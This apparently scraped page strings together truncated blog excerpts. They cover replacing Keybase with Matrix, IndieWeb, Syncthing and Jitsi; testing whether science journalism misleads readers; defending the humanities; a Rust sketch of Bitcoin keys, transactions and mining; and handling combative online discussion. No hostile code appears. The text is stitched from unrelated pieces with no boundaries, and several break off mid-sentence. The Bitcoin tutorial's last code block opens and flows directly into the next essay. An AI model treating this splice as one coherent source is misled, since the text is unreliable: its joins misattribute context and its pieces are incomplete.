Wisti</a>), so I won't go into too much detail about exactly how to do that. However, it's important to note that though Kev recommends hiding your h-card with the <code>display: none;</code> property: <a href="https://indieweb.org/antipatterns#invisible_metadata" rel="noopener noreferrer" target="_blank">don't do that</a>. I just merged my about and contact pages onto my homepage, and added the microformats classes to my existing markup.</p> <p><img alt="My IndieWeb h-card" src="https://figbert.com/content/posts/how-to-replace-keybase-in-three-easy-steps/h-card.png"></p> <h3 id="-step-3-file-storage">### Step #3: File Storage</h3> <p>Replacing KBFS is easy to do, but hard to get right. Swapping to <a href="https://www.google.com/drive/" rel="noopener noreferrer" target="_blank">Google Drive</a> is probably the move that most people would make, but that abandons the entire security/encryption aspect of Keybase. There's also <a href="https://www.dropbox.com/" rel="noopener noreferrer" target="_blank">Dropbox</a>, but that has the same problems as above. <a href="https://twitter.com/ProtonMail/status/1278389663078768641" rel="noopener noreferrer" target="_blank">ProtonDrive</a> has potential, but it's not out yet. Enter <a href="https://syncthing.net/" rel="noopener noreferrer" target="_blank"><strong>Syncthing</strong></a>. <a href="https://tonsky.me/blog/syncthing/" rel="noopener noreferrer" target="_blank">Nikita Tonsky</a> wrote one of my favorite posts of all time about Syncthing – go read it. One reason Syncthing is so great is that it's not the same thing as KBFS or any of the other "Drive" solutions. Instead of being a file hosting system, it's a "continuous file synchronization program." You have no data limits other than your storage and no third-party to worry about. Plus, sharing folders is also incredibly easy. Just read the article.</p> <h3 id="-bonus-step-4-video-calling">### Bonus Step #4: Video Calling</h3> <p>It would be a shame to talk about text chat, or really any form of communication, in this new pandemic age without talking about video chat. After all, the whole reason I'm writing this article is because the new videocalling giant <a href="https://zoom.us/" rel="noopener noreferrer" target="_blank">Zoom</a>. So, how have I replaced Zoom and how does that relate to replacing Keybase? Well, Matrix happens to have a fantastic <a href="https://jitsi.org/" rel="noopener noreferrer" target="_blank">Jitsi Meet</a> <a href="https://matrix.org/blog/2020/04/06/running-your-own-secure-communication-service-with-matrix-and-jitsi" rel="noopener noreferrer" target="_blank">integration</a>. Plus, the folks over at Jitsi are <a href="https://jitsi.org/blog/e2ee/" rel="noopener noreferrer" target="_blank">working on E2E encryption for their calls</a>. I've integrated Jitsi Meet into my self-hosted instance of Matrix, and now all my videocalls are just that – mine!</p> <h2 id="-summary">## Summary</h2> <ul> <li>Swapped chat to Matrix and Riot.</li> <li>Swapped identity verification to Indieweb.</li> <li>Swapped file storage/sync to Syncthing.</li> <li>Added videocalling to chat program via Jitsi.</li> </ul> <h2 id="-conclusion">## Conclusion</h2> <p>Keybase is a great service, and the people who work there should be really proud of what they've built. However, given Zoom's aquisition of the company, the stability and security of the product have been called into question. So, ever one to hop on a hype train, I jumped ship. I'm really happy with my solution, and I'd love to hear your thoughts as well <del>as soon as I set up webcomments</del>.</p> </section></article></div>]]>

    <h3><em>Experimentally testing journalistic accuracy</em></h3>
    <p>Published April 8, 2019</p>

<a href="https://github.com/sohamsankaran/journalism-accuracy-classification">[link to journalism accuracy classification project repo]</a></p>
<p>I believe that we should establish a new standard of journalistic ethics that places <strong>the inducement of incorrect beliefs</strong> in the minds of a significant fraction of readers <strong>at the same level of unethical behaviour as reporting incorrect facts directly</strong>. This standard can be enforced via empirical testing of articles on representative populations for relatively small amounts of money. I advocate the creation of a non-partisan independent organization funded by major media groups to <strong>maintain this ethical standard using randomized testing</strong>, above and beyond traditional fact checking.</p>
<p>As a demonstration of why this standard is necessary and how it can be applied, I conducted two experiments with 301 unique participants (200 participants each, including a 99 participant shared control group) from which evidence emerged that in at least the two cases I tested, articles that are <strong>not technically incorrect but still misleading</strong> managed to <strong>induce statistically significant increases in the fraction of people who hold a particular incorrect belief</strong> related to the central premise of the article relative to a control. Moreover, a greater percentage of participants exposed to the articles had <strong>policy preferences in line with the incorrect beliefs</strong> compared to the control group, <strong>in one case significantly</strong>.</p>
<p>The next few thousand words chronicle the story of how I got to this point. If you want to jump straight to the details of the experiment, <a href="#experiment_anchor">click here</a>, but you may lose some important context.</p>

<h4>Two perversions of science</h4>
<p>The <a href="https://nytimes.com/">New York Times</a> says that the “truth is more important now than ever”<sup id="fnref:nyt_truth"><a href="#fn:nyt_truth">1</a></sup>.</p>
<p>“Democracy Dies in Darkness”<sup id="fnref:wapo_democracy"><a href="#fn:wapo_democracy">2</a></sup>, proclaims the masthead of the <a href="https://washingtonpost.com/">Washington Post</a>.</p>
<p><a href="https://en.wikipedia.org/wiki/John_Avlon">John Avlon</a>, Editor-in-Chief of The Daily Beast from 2013-2018<sup id="fnref:avlon_eic"><a href="#fn:avlon_eic">3</a></sup>, quotes Carl Bernstein in claiming that the press generally, and I would imagine his publication in particular, is engaged in pursuing “the best available version of the truth”. He goes on to quote Daniel Patrick Moynihan in asserting that democracy requires that everyone “is entitled to their own opinion but not their own facts”<sup id="fnref:avlon_free_press"><a href="#fn:avlon_free_press">4</a></sup>.</p>
<p>In this post-modern age of post-truth reality fragmentation, media organizations who claim the center of the political spectrum hold themselves up as shining beacons of accuracy under constant assault from hostile partisans. They point to unrelenting attacks on the freedom of the press<sup id="fnref:free_press_attacks"><a href="#fn:free_press_attacks">7</a></sup>, nay, the very existence of the press<sup id="fnref:existence_press"><a href="#fn:existence_press">8</a></sup> all over the world and claim, justifiably, that their role is ever more vital to what is left of the democratic process. They see malign witchcraft in the algorithms<sup id="fnref:media_fb_yt_algorithms"><a href="#fn:media_fb_yt_algorithms">9</a></sup> of Facebook, Youtube, and company unfairly usurping the primacy of institutionally approved content in favour of blatant clickbait, much of it lies<sup id="fnref:fake_news"><a href="#fn:fake_news">10</a></sup>. They gape at the Breitbartification of Fox News<sup id="fnref:breitbartification_fox"><a href="#fn:breitbartification_fox">5</a></sup>  and the flat-earthification of Boston’s youth<sup id="fnref:flat_earth_boston"><a href="#fn:flat_earth_boston">6</a></sup>. They harken back to a simpler, truer (they’d say) time when the gatekeepers of information were reliable folk like <a href="https://en.wikipedia.org/wiki/Walter_Cronkite">Walter Cronkite</a> or <a href="https://en.wikipedia.org/en/Dan_Rather">Dan Rather</a> (oops, not him<sup id="fnref:rathergate"><a href="#fn:rathergate">11</a></sup>).</p>
<p>They're not wrong about the descent of partisan media organizations the world over into outright state-supported propagandists (in the US<sup id="fnref:state_media_us"><a href="#fn:state_media_us">12</a></sup> and in India<sup id="fnref:state_media_india"><a href="#fn:state_media_india">13</a></sup>). They’re not wrong about the chilling effects of the newfound vigour of enemies of free discourse, and I applaud the bravery of many journalists pasts and present -- in particular in India, my home -- in the face of harassment<sup id="fnref:media_harassment"><a href="#fn:media_harassment">14</a></sup>, attempts at coercion<sup id="fnref:media_coercion"><a href="#fn:media_coercion">15</a></sup>, and grievous bodily harm<sup id="fnref:media_injury_death"><a href="#fn:media_injury_death">16</a></sup>. They’re not wrong that an independent media reporting without fear or favour is essential to the health of the body politic. They’re not wrong that journalists deserve a strong defence from the all-out assault they now face, both on principle and on utilitarian grounds.</p>
<p>And yet, despite all this sanctimony and all these paeans to the inestimable value of the truth, these media organizations are often horrifically bad at their self-defined job -- reporting, spreading, and protecting that truth.</p>
<p>This is not a new insight. <a href="https://en.wikipedia.org/wiki/Michael_Crichton">Michael Crichton</a>, the famed author of such classics as <a href="https://en.wikipedia.org/wiki/Jurassic_Park">Jurassic Park</a> and <a href="https://en.wikipedia.org/wiki/The_Andromeda_Strain">The Andromeda Strain</a> as well as a Harvard-educated medical doctor, gave a speech in 2002 called <a href="http://larvatus.com/michael-crichton-why-speculate/">“Why Speculate?”</a> in which he coined the term “Murray Gell-Mann Amnesia”<sup id="fnref:why_speculate"><a href="#fn:why_speculate">17</a></sup>. The Gell-Mann Amnesia effect refers to this seemingly widespread phenomenon: many experts across many fields know that media coverage of their particular area is often dangerously wrong, while nevertheless continuing to trust coverage about areas outside their expertise. Much of the world seemingly turns on the inability of people to update their priors<sup id="fnref:what_is_a_prior"><a href="#fn:what_is_a_prior">18</a></sup>, but this is a particularly odd effect because, as Crichton notes, this (anecdotally) does not seem to apply to information received from people in real life -- we tend to discount information from those who have consistently proven themselves to be wrong about things we have good information about. Why, then (Crichton wonders), this <a href="https://en.wikipedia.org/wiki/Bayes_theorem">Bayesian</a> incompetence when confronted with evidence of media inaccuracy?</p>
<p>I have certainly been personally afflicted by Gell-Mann Amnesia. Starting from my early teens, I’ve read a prodigious amount of media on a daily basis -- including the New York Times, the Washington Post, <a href="https://thedailybeast.com/">The Daily Beast</a>, <a href="https://theatlantic.com/">The Atlantic</a>, <a href="https://newrepublic.com/">The New Republic</a>, <a href="https://slate.com/">Slate</a>, <a href="https://foreignpolicy.com/">Foreign Policy</a>, <a href="https://economist.com/">The Economist</a>, <a href="https://theguardian.com/">The Guardian</a>, <a href="https://newyorker.com/">The New Yorker</a>, <a href="https://timesofindia.com/">The Times of India</a>, <a href="https://hindustantimes.com/">the Hindustan Times</a>, <a href="https://asianage.com/">the Asian Age</a>, <a href="https://thewire.in/">The Wire</a>, <a href="https://caravanmagazine.in/">Caravan magazine</a> and many others. When I was younger, I trusted most of the ‘factual’ coverage (though never Opinion) to be mostly correct modulo some weighting by the generally accepted ‘reliability’ of the source. ‘Gold standard’ publications like the NYT and the <a href="https://thetimes.co.uk/">The Times</a> (London) I typically took to be correct enough to break even strong pre-existing conflicting priors that I had.</p>
<p>Part of the problem there was that as a kid, I had little to no legitimate expertise in anything, and I couldn’t easily call out factual errors.  It took a number of bad articles about India in ‘gold standard’ British and American publications (and a few written about me, personally, in the Indian media) to completely shake my belief in the accuracy of what I was reading everyday.</p>
<p>I was lucky to have the opportunity, mostly by accident of birth, to attend a top university (Yale) and make it out the other side. I’ve now worked on legitimate research in computer science<sup id="fnref:soham_cs_work"><a href="#fn:soham_cs_work">19</a></sup> and sociology<sup id="fnref:soham_sociology_work"><a href="#fn:soham_sociology_work">20</a></sup>, and I can competently understand (to a first approximation) almost any academic paper in CS, medicine, the hard sciences (at least experimental work), and the social sciences, either by myself or with the generous assistance of the many working academics in those fields that I know well. If I see an article about any of those fields, I can typically work my way back to the source and figure out if the article was accurate in its reporting at least about what the paper claimed to do, quality of the underlying work or study aside.</p>
<p>Here’s what I’ve learned from doing this again and again -- a staggering quantity of science journalism is deeply, indefensibly wrong. This is true in CS, this is true in the hard sciences and, most of all, this is true in the social sciences and medicine.</p>
<p>Science journalism can be broadly classified into three types:</p>
<p><strong>Plainly incorrect (Type 1)</strong>: the article gets at least one important fact egregiously wrong.</p>
<p><strong>Misleading (Type 2)</strong>: The article does not directly get important facts wrong, but induces incorrect beliefs in the minds of readers through framing and/or omission.</p>
<p><strong>Correct (Type 3)</strong>: The article does not get anything (at least anything important) wrong and does not mislead.</p>
<p>It is not a new insight that articles of Type 1 -- plainly incorrect pieces about science -- exist, even in well-regarded publications. You can find a random sample of examples across <a href="https://gizmodo.com/">Gizmodo's</a> <a href="https://gizmodo.com/the-worst-reported-science-stories-of-2017-1821271490">ranking of the worst science journalism of 2017</a><sup id="fnref:gizmodo_2017_worst_science"><a href="#fn:gizmodo_2017_worst_science">21</a></sup> and <a href="https://discovermagazine.com/">Discover Magazine's</a> now defunct but much missed <a href="http://discovermagazine.com/tags/?tag=worst+science+article+of+the+week">Worst Science Article of the Week column</a><sup id="fnref:discover_worst_science"><a href="#fn:discover_worst_science">22</a></sup>.</p>
<p>My own interest in writing about this was sparked by two plainly incorrect (Type 1) articles, one in the Washington Post and one in The Daily Beast, that got the science they were covering stupendously wrong.</p>
<p>The <a href="https://www.washingtonpost.com/news/innovations/wp/2018/02/05/quantum-computers-may-be-more-of-an-imminent-threat-than-ai/">first article</a> is by <a href="https://en.wikipedia.org/wiki/Vivek_Wadhwa">Vivek Wadhwa</a>, and it ran (at least online) on February 5, 2018 in the Washington Post<sup id="fnref:wadhwa_wapo"><a href="#fn:wadhwa_wapo">23</a></sup>. It is titled “Quantum computers may be more of an imminent threat than AI” -- right away, your bullshit detector should go off like a fucking klaxon -- and it caused something of a stir in the Computer Science community. <a href="https://en.wikipedia.org/wiki/Scott_Aaronson">Scott Aaronson</a>, the UT Austin quantum computing professor and legendary blogger, <a href="https://www.scottaaronson.com/blog/?p=3645">reviewed the article</a> in the style of New York Times food critic <a href="https://en.wikipedia.org/wiki/Pete_Wells">Pete Wells’</a> famed <a href="https://www.nytimes.com/2012/11/14/dining/reviews/restaurant-review-guys-american-kitchen-bar-in-times-square.html">review</a> of <a href="https://en.wikipedia.org/wiki/Guy_Fieri">Guy Fieri’s</a> Times Square Restaurant, and his takedown is absolutely worth the read<sup id="fnref:aaron_article"><a href="#fn:aaron_article">24</a></sup>. In short, Wadhwa got basically everything about QC wrong, and also managed to claim that it would take greater than 1000 years for a classical computer to solve the <a href="https://en.wikipedia.org/wiki/Travelling_salesman_problem">Travelling Salesman Problem for 22 cities</a>. In fact, it would take a reasonably specced present-day desktop a fraction of a second to solve TSP for 22 cities with purely classical algorithms<sup id="fnref:tsp_22"><a href="#fn:tsp_22">25</a></sup>.</p>
<p>This in itself would be pretty bad, but then Wadhwa shows up in the comments to Aaronson’s blog post, defends himself by claiming that he ripped the op-ed off a TED talk, misrepresents the context of his consultation with another computer scientist (<a href="https://soh.am/writes/at_the_edge_of_deception/(https://en.wikipedia.org/wiki/William_J._Cook)">Bill Cook</a> of Johns Hopkins) <sup id="fnref:wadhwa_bill_cook"><a href="#fn:wadhwa_bill_cook">28</a></sup>, and storms off in a huff.</p>
<p>Somehow, no correction has yet been issued for this article (as of this writing)<sup id="fnref:wadhwa_opinion"><a href="#fn:wadhwa_opinion">65</a></sup>. It remains up on the Washington Post’s website, deceiving any reader without a background in both Quantum Computing and Computational …</p></div>

<p>I have been holding off writing something like this, because it is often such a well-worn topic and I hardly wanted to preach to the converted.  But at the same time, the humanities need all of the defenses they can get and I’ve found, looking at the genre, that my answers for why we need the humanities are rather different from the typical answer.</p>



<p>But first, the <strong>shameless plug</strong> that if <strong>you</strong>, yes <strong>you!</strong> want to support the humanities, you can support <em>this</em> humanist by sharing my writing, subscribing with the button below or by supporting me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>.  Your support enables me to continue telling you and other people to continue supporting me, a giant self-devouring<a href="https://en.wikipedia.org/wiki/Ouroboros"> ouroboros </a>of support that will grow to become so large it will crush the world (I look forward to regretting this joke in the future).</p>






<p>Edit: A friendly reminder to those in the comments: you will be <em>civil</em>.  This thread has prompted some spirited discussion.  That’s fine.  But it will remain polite.</p>



<h2>What Humanities?</h2>



<p>First, just to define my terms, <strong>what are the humanities</strong>?  Broadly, they are the disciplines that study human society (that is, that are concerned with humanity): language study, literature, philosophy, history, art history, archaeology, anthropology, and so on.  It is necessarily a bit of a fuzzy set.  But what I think defines the humanities more than subject matter is <strong>method</strong>; the humanities study things which (we argue) <em>cannot</em> be subjected to the rigors of the scientific method or strictly mathematical approaches.  You cannot perform a controlled trial in beauty, mathematical certainty in history is almost always impossible, and there is no way to know much stress a society can bear except to see it fail.  Some things cannot be reduced to numbers, at least not by the powers of the technology-aided human mind.</p>



<p>By way of example, that methodological difference is why there’s a division between <strong>political science</strong> and <strong>history</strong>, despite the two disciplines historically being concerned with many of the same subjects and the same questions (to the point that Thucydides is sometimes produced as the founder of both):<strong> they use different methods</strong>.  History is a humanities discipline through and through, whereas political science attempts to hybridize humanities and STEM (Science, Technology, Engineering and Mathematics) approaches; that’s not to say historians never use statistical approaches (I do, actually, quite a lot) but that there are very real differences in methodology.  As you might imagine, that difference leads to some <a href="https://warontherocks.com/2020/06/want-better-strategists-teach-social-science/">competition </a>and <a href="https://warontherocks.com/2020/05/finally-getting-serious-about-professional-military-education/">conflict </a>between the disciplines as to whose methodology best answers those key questions or equips students to think about them.  Given that I have a doctorate in history and self-identify as a historian, you will have no trouble guessing which side of this I come down on, although that might be a bit self-interested on my part.</p>

I was struck reading this (and the Genji Monogatari; the two works were paired in the course) by how radically different the culture was from any of the ones I knew.  It was one of the first moments I ‘got’ the ‘past is a foreign country’ thing.  At the same time, when I later dug deeper into Roman martial culture, the commonalities between Roman elite military virtue and the values of the Tale of the Heike were striking.  The human part of ‘the human experience’ is common, even if the experience part is not.<br>Since this isn’t a topic where visual illustration is strictly on-point, I am going to use the images here to share some of the works outside of Greek and Roman history, which I encountered in my education in the humanities which influenced me and my thinking.</figcaption></figure>



<p>So if the STEM fields are, at some level, fundamentally about numbers, the humanities are <strong>fundamentally about language</strong>.  The universe may be made of numbers, but the human mind and human societies are constructed out of language.  Unlike computers, we do not think in numbers, but in words and consequently, the study of humans as <em>thinking</em> creatures is mostly about those words (yes, yes, I see you there, economics and psychology; there are edge cases, of course).  Our laws are written in words because our thoughts form <em>in our heads</em> as words; we naturally reason with words and we even <em>feel</em> with words.  Humans are linguistic creations in a mathematical universe; consequently, while the study of the universe is mediated through math, the study of humans and human minds is fundamentally linguistic in nature.</p>



<p>Thus, the humanities.</p>



<h2>Oh, the Humanities!</h2>



<p>Now I want to note here the standard defense of the humanities, which is that the study of human culture, literature and art enriches the soul and the experience of life.  <strong>This is, to be clear, undoubtedly true</strong>.  There is joy and richness in the incredible kaleidoscope of human expression and a deep wisdom in the realization of both how that expression joins us, and how radically different it can be.  There is also the enjoyment of developing a ‘palette’ for art and literature which is enhanced by knowing <em>more</em> of it, in being able to see the innovations and cross-connections (the ‘intertext’ to use the unnecessarily fancy academic term).  This is all very much the case.  There is a reason that rich people with abundant free time have consistently gravitated to the study of the humanities, or supported it.</p>



<p><strong>But this is a weak defense of the humanities as they are currently constructed</strong>.  The fact is that the academic humanities exist because people who <em>do not study the humanities</em> fund them.  The modern study of the humanities, in its infancy, was paid for by wealthy elites who wanted either that joyful richness or at least the status that came from funding it.  I should note here also that the humanities were never for the <em>teachers</em> of the humanities, but for its students.  The rich funders of the humanities were rarely the authors of the great treatises or studies; rather they wished to be the <em>readers of them</em> (and likewise, the modern academic humanities are not <em>for</em> professors, but the students we teach; more on this next time).  Down until really quite recently, education in the humanities was largely reserved for that elite and their academic clients.  As public support for the humanities continues to decline, many humanities fields seem in real danger of reverting back to that status: a prestigious toy for the already-rich and already-elite.</p>

In high school, I had largely been taught Greek mythology as a stand-alone idea, something the Greeks came up with all on their own – indeed, I was taught all of ancient Greek culture that was, as if it just sprang out of the ground.  Reading Kingship in Heaven – the myth of Teshub’s origin – was revelatory, because here was a forerunner to Hesiod’s Theogony, the foundation-stone for teaching Greek mythology.  <a href="https://www.amazon.com/East-Face-Helicon-Clarendon-Paperbacks/dp/0198152213">Hesiod had been borrowing</a>, he had been influenced and Greek mythology no longer stood on its own but slowly wrapped itself into an older, richer edifice of literature stretching back to the haziest beginnings of our knowledge.</figcaption></figure>



<p>Avoiding that retreat of the humanities back into the wealthy elite means defending the humanities on different grounds.  Of course, the traditional humanities will always survive at Harvard or Cambridge or Yale.  But for the humanities to actually be <em>generally</em> available, they need to survive, to thrive, outside of those spaces.  And yet, no good that is tethered to colleges can be justified solely through the benefit it gives the holder.  <strong>Colleges, after all, are publicly funded, but while everyone pays taxes, not everyone goes to college</strong>.  The OECD average rate for tertiary-education-completion among adults<a href="https://en.wikipedia.org/wiki/List_of_countries_by_tertiary_education_attainment"> is around 37% </a>and not all of those are four-year university degrees.  To break down the United States’ data, while 44% of Americans have completed some kind of tertiary education, putting the USA towards the top of the scale (and around two-thirds have at least <em>some</em> college, though they may not have completed it), <a href="https://en.wikipedia.org/wiki/Educational_attainment_in_the_United_States">only 35% of Americans have a four-year degree</a>.  And of course, only a subset of those degree-holders will have taken very much in the way of the humanities.  Which means <strong>the taxes that pay to fund the public universities that make up the great bulk of the study of the humanities are going to mostly come from people who have not, or could not, avail themselves of a humanistic education</strong>.</p>



<p>Even if we made the humanities available to all – a goal I robustly support (it is one reason I am spending all this time working on this open, free web platform, after all) – that effort would likely have to be publicly funded through a great many tax-payers who did not care to consume much of the <em>academic</em> products of the humanities (even if they consume many of its pop-cultural byproducts without knowing it).  <strong>We must be able to justify the expense to them</strong>.  And alas, while I love crowd-funding (did I mention, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>?), it is simply not an alternative for the research and teaching environment of the university (though I think it is and ought to be an important parallel model, for reasons I’ll get into in a moment).  The fact is that while ‘short’ essays, blog posts and public-facing books can be popularly funded, <strong>the slow, painstaking work that forms the <em>foundation</em> for those efforts has no ready popular market</strong>; but without the latter, the former withers (as a note: my <em>next</em> Collections post will be on the process by which knowledge filters from the latter to the former).</p>



<p><strong>We must be prepared to explain the value of the humanities to people for …</strong></p></div></div>

                <p>03 July 2020</p>
                <p>Understanding the fundamental building blocks(😉) of Bitcoin can be daunting for some developers. I find it difficult to meaningfully understand a system without knowing how everything fits together. </p>
                <p>A good way to go through this process is to lay down, however rudimentary, a set of processes by which the system operates. Hence the purpose of this guide is to explain through simple pieces of code, how Bitcoin works.</p>
                <p>Note: The intention is not to create a real implementation of the Bitcoin protocol. It also does not aim to explain every concept. Look for the embedded links if you find a concept you need to go over. Also look out for notes where concepts have been simplified and differ from the real Bitcoin implementation.</p>
                <p>Hopefully by the end of this series, we should have a bitcoin-like protocol anyone can run.</p>
                <p>The code written until this point is available <a href="https://github.com/monokh/nibble/tree/813d3d694d1ea0b6c71ce5854a1393e9deb61904">here</a>.</p>
                <p>From a very high level. This is bitcoin:</p>
                <pre id="code-main"><code>
let keypair = crypto::KeyPair::new();
let keypair2 = crypto::KeyPair::new();

let tx1 = create_signed_tx(&amp;keypair, keypair2.public_key, 123);
let tx2 = create_signed_tx(&amp;keypair2, keypair.public_key, 75);

let txs = vec![tx1, tx2];

let proposed_block = block::ProposedBlock {
    transactions: txs,
};

println!("Mining block with {} txs.", proposed_block.transactions.len());
let block = proposed_block.mine(3); // Difficulty 3 i.e. hash must begin with "000"
println!("Mined block: {:#?}", block);
                </code></pre>
                <p>We can split what we see here into the following categories:</p>
                <ul>
                    <li>Keys</li>
                    <li>Transactions</li>
                    <li>Blocks</li>
                    <li>Mining</li>
                </ul>

                <h2>Keys</h2>
                <p>Keys are required as a means to achieve ownership. In other words, you need to have the key to spend a certain amount of bitcoin.</p>
                <pre><code>
pub struct KeyPair {
    pub public_key: key::PublicKey,
    private_key: key::SecretKey,
}
                </code></pre>
                <p>Your keys actually consist of 2 parts. The private key and the public key. The public key can be shared with the world and is used to receive bitcoin, whereas the private key is something you keep secure as it can be used to spend your bitcoin. <a href="https://nakamoto.com/public-key-cryptography/#public-keys-as-identity">More on public key cryptography.</a></p>

                <h3>Creating keys</h3>
                <p>In bitcoin, <a href="https://hackernoon.com/what-is-the-math-behind-elliptic-curve-cryptography-f61b25253da3">eliptic curves are used for public key cryptography</a> - specifically secp256k1. In essense, using a (psuedo)random number we can generate a pair of keys that can be thought of as a user's wallet. </p>
                <pre><code>
let mut rand = rand::OsRng::new().unwrap();
let secp = Secp256k1::new();
let (private_key, public_key) = secp.generate_keypair(&amp;mut rand);
KeyPair {
    secp,
    public_key,
    private_key,
}
                </code></pre>

                <h2>Transaction</h2>
                <p>Transactions are the smallest unit of the Bitcoin system. A transaction is a data structure which encodes a payment of x bitcoins from a to b.</p>
                <p>In Bitcoin, transactions are not as simple as transferring a balance (account based), but rather a collection of inputs and outputs. This is generally called the <a href="https://en.wikipedia.org/wiki/Unspent_transaction_output">"UTXO model"</a>.</p>
                <pre><code>
pub struct Transaction {
    pub from: PublicKey,
    pub to: PublicKey,
    pub amount: u32
}
                </code></pre>
                <p>The public keys here are precisely from the key pairs that were generated. </p>
                <p>What then prevents anyone from transferring on behalf of others? Public key cryptography. To be a valid transaction and be accepted into the network by others, the transaction needs to be "Signed" by the `from` private key. </p>
                <pre><code>
impl KeyPair {
    pub fn sign(&amp;self, message: &amp;[u8]) -&gt; Signature {
        ...
        self.secp.sign(&amp;message, &amp;self.private_key);
    }
}
                </code></pre>

                <h3>Signed transaction</h3>
                <p>As mentioned previously, private keys exercise control over a number of bitcoins. A's private key is used to sign a transaction so that anyone can verify that the transaction from A to B was in fact authorised by A. </p>
                <pre><code>
let tx = transaction::Transaction {
    from: keypair.public_key,
    to,
    amount,
};

let sig = keypair.sign(&amp;tx.hash());

return transaction::SignedTransaction{
    transaction: tx,
    sig: sig.to_string(),
};
                </code></pre>

                <h2>Block</h2>
                <p>A block is a collection of transactions. These transactions should be signed and therefore valid.</p>
                <pre><code>
let tx1 = create_signed_tx(&amp;keypair, keypair2.public_key, 123);
let tx2 = create_signed_tx(&amp;keypair2, keypair.public_key, 75);

let txs = vec![tx1, tx2];

let proposed_block = block::ProposedBlock {
    transactions: txs,
};
                </code></pre>
                <p>In fact, on the bitcoin network, the only data which is replicated across are the blocks. The purpose of the block is to effectively write it's containing transactions into history. It achieves this by mining.</p>

                <h2>Mining</h2>
                <p>The process of <a href="https://en.bitcoin.it/wiki/Mining">mining</a> is to do a computation to ensure that there is something at stake. In other words, the miner has to prove they have done some work - <a href="https://en.bitcoin.it/wiki/Proof_of_work">"Proof of Work"</a></p>
                <p>To provide the correct proof of work for a block:</p>
                <ol>
                    <li>Serialise the block</li>
                    <li>Append a number</li>
                    <li>Hash it</li>
                    <li>Increment the number</li>
                    <li>Go back to 1</li>
                </ol>

                <p>The PoW is suffice if the hash begins with a certain number of 0s. The number of 0s required is called <a href="https://en.bitcoin.it/wiki/Difficulty">difficulty</a>. The more difficulty - the more 0s are required. </p>

                <p>In reality, the difficulty is defined on a more granular level. See <a href="https://en.bitcoin.it/wiki/Difficulty">difficulty on the bitcoin wiki</a> for more information.</p>

                <pre><code>
let mut nonce: u32 = 0;
let block_string = self.serialize();

loop {
    let block = format!("{}{}", block_string, nonce);
    let block_hash = hex::encode(crypto::sha256(block.clone()));
    if block_hash.starts_with(&amp;"0".repeat(difficulty)) {
        return Block {
            hash: block_hash,
            nonce,
            transactions: self.transactions
        }
    }
    nonce += 1;
}
                </code></pre>

                <p>You should hopefully now see how this all fits together. To recap the high level code <a href="#code-main">initially presented</a>:</p>

                <ol>
                    <li>Generate keypairs for each user</li>
                    <li>Using the private key of the user, sign transactions that move bitcoin</li>
                    <li>Combine these transactions in a "block"</li>
                    <li>Perform the PoW on this block until the difficulty condition is met</li>
                </ol>

                <p>Finally running this program will produce a block including the signed transactions. Take note of the hash. It begins with "000", therefore it is a valid block when difficulty is set to 3.</p>

                <pre><code>

                  <p>Imagine you're at a dinner party, and you're getting into a heated argument. As you start yelling, the other people quickly hush their voices and start glaring at you. None of the onlookers have to take further action—it's clear from their facial expressions that you're being a jerk.</p>

<p>In digital conversations, giving feedback requires more conscious effort. Silence is the default. Participants only get feedback from people who join the fray. They receive no signal about how the silent onlookers perceive their dialogue. In fact, they don't receive much signal that onlookers observed the conversation at all.<span><sup id="footnote-label--1">1</sup></span></p>

<p><span>As a result, the feedback you do receive in digital conversations is more polarized, because the only people who will engage are those who are willing to take that extra step and bear that cost of wading into a messy conversation. </span></p>

<p>When Angry Alice tweets something obnoxious or unproductive, reasonable people just scroll past it. If Alice develops a pattern of bad behavior, reasonable people will just unfollow, mute, or block her. The result is that it's hard for Alice to notice the silent majority of people who saw the trash fire and walked away when they recognized that engaging would only fuel its flames.</p>

<p>It gets worse—Angry Alice only sees feedback from extremists, so she doesn't receive more nuanced signals that might actually cause her to reflect on her behavior. <span>If no reasonable people give feedback, only the unreasonable people are left. </span>From Alice's perspective, the only people who disagree with her are jerks.</p>

<p>This is a coordination problem. Reasonable people understand that if they join the fray alone, they'll most likely be drowned out by the yelling, or worse they'll get dragged deeper into it. As a result, they choose stay out of it. </p>

<p>A huge part of the problem is that digital spaces generally have no equivalent of a disapproving glare. You're stuck choosing between staying silent and entering the fray, with few options in between. If you have little reason to believe that other reasonable people will back you up, you're going to stick with the default: silence.</p>

<p>This is a hard problem to solve, but it's not impossible. <span>You</span> can break the coordination trap! <span><sup id="footnote-label--2">2</sup></span></p>

<p>For example, I often send friendly DMs to combatants to share my perspective on how they could make combative Twitter threads more productive.</p>

<p>This works far better than you'd expect! In the last few years, I've DMed at least a dozen people who were being unreasonable or mean on Twitter. In all cases but one, it resulted in a constructive conversation between me and that person. In most cases, that in turn led to a retraction of their original tweet, a clarification of their position, or a marked improvement in subsequent discourse.</p>

<p>Four things I've found that make this approach more likely to succeed:</p><ol><li><p>You must show the person that you're not trying to attack them but to make them <span>more effective</span>. You're giving them feedback on process, not a moral lecture.</p></li><li><p>Bringing it into a private space<span><sup id="footnote-label--3">3</sup></span> like DMs is crucial, because it credibly shows that you're not trying to get brownie points from your in-group by bashing them in public.</p></li><li><p>This works better if the conversation at hand is in a thread you yourself started. It's a bit like giving feedback to someone at a party you're hosting—they're more likely to respect your boundaries in a social space you created. This is not a requirement, but it helps.</p></li><li><p>Make sure you're not dealing with a grifter. A grifter is someone who benefits from perpetuating the problem and has no actual desire to solve it (despite their rhetoric that may say otherwise). If they're a grifter, all the above advice is useless. Get away from the trash fire as fast as you can.</p></li></ol>
<p>I should note, this is a lot of work. There's a reason I've only done it about a dozen times over the last few years, even though there have been far, far more opportunities to do so. </p>

<p>But if everyone tried this method just a few times a year, then we just might break through this silence and raise the quality of our digital discourse.</p>

